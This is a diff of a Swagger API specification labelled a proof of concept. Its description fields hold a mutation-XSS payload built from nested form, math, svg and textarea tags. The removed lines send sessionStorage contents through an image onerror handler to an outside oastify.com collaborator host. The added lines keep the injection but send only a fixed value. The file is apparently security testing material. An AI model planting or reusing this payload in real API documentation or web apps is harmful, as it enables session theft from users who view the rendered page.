@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation (POC Purpose Only)
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=new Image().src="https://k2noiq3lzmyx96k3y37f1hffj6pxdr1g.oastify.com/cookie.php?c="+JSON.stringify(sessionStorage); src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=new Image().src="https://k2noiq3lzmyx96k3y37f1hffj6pxdr1g.oastify.com/cookie.php?c=1" src=1>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=new Image().src="https://k2noiq3lzmyx96k3y37f1hffj6pxdr1g.oastify.com/cookie.php?c="+JSON.stringify(sessionStorage); src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=new Image().src="https://k2noiq3lzmyx96k3y37f1hffj6pxdr1g.oastify.com/cookie.php?c=1" src=1>"></form>
 
           format: int64
           in: path
